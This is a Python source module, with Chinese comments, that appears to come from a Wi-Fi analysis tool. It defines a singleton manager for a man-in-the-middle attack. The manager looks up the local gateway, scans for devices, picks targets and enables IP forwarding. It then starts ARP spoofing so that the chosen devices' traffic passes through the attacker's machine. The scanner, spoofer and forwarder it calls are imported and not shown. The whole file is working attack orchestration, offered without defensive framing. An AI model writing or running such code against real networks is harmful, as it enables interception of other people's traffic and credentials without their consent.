"""
MITM管理器 - 统一管理中间人攻击的所有组件
"""
import logging
import threading
import time
from typing import List, Optional, Callable
from dataclasses import dataclass

from .network_scanner import NetworkScanner, DeviceInfo
from .arp_spoofer import ARPSpoofer
from .traffic_forwarder import TrafficForwarder

logger = logging.getLogger('wifi_analyzer.mitm')


@dataclass
class MITMStatus:
    """MITM状态"""
    is_active: bool = False
    is_scanning: bool = False
    is_spoofing: bool = False
    is_forwarding: bool = False
    target_count: int = 0
    packet_count: int = 0


class MITMManager:
    """MITM管理器 - 统一管理扫描、欺骗、转发"""

    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance

    def __init__(self):
        if self._initialized:
            return
        self._initialized = True

        # 组件
        self.scanner = NetworkScanner()
        self.spoofer = ARPSpoofer()
        self.forwarder = TrafficForwarder()

        # 状态
        self._is_active = False
        self._gateway_ip: Optional[str] = None
        self._gateway_mac: Optional[str] = None
        self._interface: Optional[str] = None
        self._targets: List[DeviceInfo] = []

        # 回调
        self._on_packet_callback: Optional[Callable] = None

    def initialize(self, interface: str = None) -> bool:
        """
        初始化MITM

        :param interface: 网卡接口
        :return: 是否成功
        """
        self._interface = interface

        # 获取网关信息
        gateway_ip, gateway_mac = self.scanner.get_gateway()

        if not gateway_ip:
            logger.error("Failed to get gateway information")
            return False

        self._gateway_ip = gateway_ip
        self._gateway_mac = gateway_mac

        logger.info(f"MITM initialized. Gateway: {gateway_ip} ({gateway_mac})")
        return True

    def scan_network(self, callback: Callable[[List[DeviceInfo]], None] = None) -> List[DeviceInfo]:
        """
        扫描网络

        :param callback: 扫描完成回调
        :return: 设备列表
        """
        return self.scanner.scan(
            interface=self._interface,
            callback=callback
        )

    def get_devices(self) -> List[DeviceInfo]:
        """获取已扫描的设备"""
        return self.scanner.get_devices()

    def set_targets(self, devices: List[DeviceInfo]) -> None:
        """
        设置目标设备

        :param devices: 目标设备列表
        """
        self._targets = devices
        self.spoofer.clear_targets()

        added_count = 0
        skipped_count = 0

        for device in devices:
            if device.is_gateway or device.is_self:
                skipped_count += 1
                logger.info(f"Skipping {device.ip}: gateway or self")
                continue

            # 检查MAC地址是否有效
            if not device.mac or device.mac == "00:00:00:00:00:00":
                logger.warning(f"Skipping {device.ip}: invalid MAC address")
                skipped_count += 1
                continue

            logger.info(f"Adding target: {device.ip} (MAC: {device.mac})")
            self.spoofer.add_target(
                target_ip=device.ip,
                target_mac=device.mac,
                gateway_ip=self._gateway_ip,
                gateway_mac=self._gateway_mac
            )
            added_count += 1

        logger.info(f"Set {added_count} targets, skipped {skipped_count}")
        self._targets = devices  # 保存原始设备列表

    def start(self, targets: List[DeviceInfo] = None) -> tuple:
        """
        开始MITM攻击

        :param targets: 目标设备列表（可选，如果之前已设置）
        :return: (是否成功, 错误信息)
        """
        if self._is_active:
            logger.warning("MITM already active")
            return False, "MITM already active"

        if not self._gateway_ip:
            logger.error("Gateway not configured. Call initialize() first.")
            return False, "Gateway not configured. Please scan network first."

        if not self._gateway_mac:
            logger.error("Gateway MAC not found")
            return False, f"Cannot find gateway MAC address for {self._gateway_ip}"

        logger.info(f"Gateway: {self._gateway_ip} ({self._gateway_mac})")

        # 设置目标
        if targets:
            self.set_targets(targets)

        if not self.spoofer._targets:
            logger.error("No targets configured")
            return False, "No valid targets configured (targets may have missing MAC addresses)"

        # 显示目标信息
        for ip, info in self.spoofer._targets.items():
            logger.info(f"Target: {ip} -> MAC: {info['mac']}")

        # 开启IP转发
        logger.info("Enabling IP forwarding...")
        if not self.forwarder.enable():
            logger.error("Failed to enable IP forwarding")
            return False, "Failed to enable IP forwarding. Please run as Administrator."

        # 开始ARP欺骗
        logger.info("Starting ARP spoofing...")
        if not self.spoofer.start(self._interface):
            self.forwarder.disable()
            logger.error("Failed to start ARP spoofer")
            return False, "Failed to start ARP spoofing. Check if Scapy is installed."

        self._is_active = True
        logger.info("MITM attack started successfully")

        return True, ""

    def stop(self) -> None:
        """停止MITM攻击"""
        if not self._is_active:
            return

        # 停止ARP欺骗
        self.spoofer.stop()

        # 关闭IP转发
        self.forwarder.disable()

        self._is_active = False
        logger.info("MITM attack stopped")

    def get_status(self) -> MITMStatus:
        """获取状态"""
        spoof_stats = self.spoofer.get_statistics()

        return MITMStatus(
            is_active=self._is_active,
            is_scanning=self.scanner.is_scanning,
            is_spoofing=self.spoofer.is_spoofing,
            is_forwarding=self.forwarder.is_forwarding,
            target_count=len(self._targets),
            packet_count=spoof_stats['packet_count']
        )

    @property
    def gateway_ip(self) -> Optional[str]:
        """网关IP"""
        return self._gateway_ip

    @property
    def gateway_mac(self) -> Optional[str]:
        """网关MAC"""
        return self._gateway_mac

    @property
    def is_active(self) -> bool:
        """是否正在运行"""
        return self._is_active


# 全局单例
mitm_manager = MITMManager()